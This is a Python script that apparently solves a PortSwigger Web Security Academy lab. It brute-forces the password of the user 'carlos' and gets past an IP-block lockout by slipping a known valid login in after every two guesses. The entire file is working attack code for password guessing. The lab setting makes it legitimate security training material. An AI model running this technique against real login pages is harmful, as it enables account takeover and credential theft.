import requests

# Update lab url from https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block
url = 'https://UPDATEME.web-security-academy.net/login'

known_victim_username = 'carlos'

known_valid_username = 'wiener'
known_valid_password = 'peter'

# Saved to file from https://portswigger.net/web-security/authentication/auth-lab-passwords
auth_lab_passwords = 'auth-lab-passwords.txt'

def login(username, password):
    payload = {'username': username.rstrip(),'password': password.rstrip()}
    # Disable redirect because we need to see 302 status code to detect login success
    response = requests.post(url, data=payload, allow_redirects=False) 
    return response


# Create initial password list
with open(auth_lab_passwords, 'r') as f:
    passwords = f.readlines()

# Index tracker
i = 0 

# Insert a known good password every 3rd element (starting at index 0)
while i < len(passwords):
    passwords.insert(i, known_valid_password)
    i = i + 3

# Create username list so that the element index of a good password 
# will match the same index of good username every 3rd element.
# Otherwise insert the victim username so that it matches a password we want to try
usernames = []
while i > 0:
    if i % 3 == 0:
        usernames.append(known_valid_username)
    else:
        usernames.append(known_victim_username)
    i = i - 1

# Create tuple from username/password list
credentials = zip(usernames, passwords)

# Attack
for cred in credentials:
    u, p = cred

    response = login(u, p)

    if response.status_code == 302 and str(u).rstrip() == known_victim_username:
        print(f'WORKING CREDENTIAL FOUND! {u.rstrip()}:{p.rstrip()}')
        quit()
            